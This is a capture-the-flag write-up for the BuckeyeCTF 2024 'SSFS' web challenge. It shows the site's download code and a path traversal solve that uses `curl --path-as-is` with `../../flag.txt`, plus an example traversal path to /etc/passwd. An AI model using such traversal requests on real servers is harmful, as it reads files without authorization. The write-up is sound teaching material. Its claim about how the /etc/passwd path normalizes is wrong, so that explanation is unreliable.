---
title: BuckeyeCTF 2024 - SSFS
date: 2024-10-07 00:29:20 
categories: [CTF, BuckeyeCTF, Web]
tags: [CTF, Path traversal, Web, Curl]
---

## Page Source Inspection

The actual functionality of uploading and downloading files weren't working so I looked at the page source. I saw this portion of the source:

```html
const searchFile = async () => {
	let formData = new FormData(searchForm);
	console.log([...formData][0]);
	let response = await fetch('/search/' + [...formData][0][1], {
		method: 'GET',
	});
	searchWrapper.hidden = false;
	if (response.status === 200) {
		searchMessage.innerHTML = 'File found. Download link: <a href="/download/' + [...formData][0][1] + '">Download</a>';
	} else {
		searchMessage.innerHTML = 'File not found.';
	}
}
```

If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:

```html
searchMessage.innerHTML = 'File found. Download link: <a href="/download/' + [...formData][0][1] + '">Download</a>';
```

So, when I tried to access the `/download/flag.txt`, I got an error message back:

```bash
└─$ curl https://ssfs.challs.pwnoh.io/download/flag.txt             
{"message":"File not found","status":"error"}
```

So, I assumed that this could be a path traversal related challenge (and also given that this is the very first challenge in the Web category). But when I tried a few different paths such as `/download/../flag.txt or /download/../../flag.txt`, I got an error that the URL was not found. When I looked at the web browser, my initial request address was resolved to `https://ssfs.challs.pwnoh.io/flag.txt` instead. This is because of the **Path Normalization**.

## Path Normalization

**Path Normalization** is the process of transforming a URL's path into a standard, canonical form. For example, if someone is trying to path traverse to access some secret file:

```
http://example.com/download/../../etc/passwd
```

This will resolve to:

```
http://example.com/download/etc/passwd
```

In order to ignore(?) this, I learned that I can use `curl`'s `--path-as-is` option to test possible path traversal vulnerability. Once I learned how to use this option, it was a basic path traversal challenge.

## Solve

So, if we try something like this, we can get the flag:

```
└─$ curl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt   
bctf{4lw4y5_35c4p3_ur_p4th5}                                                                                                     
```

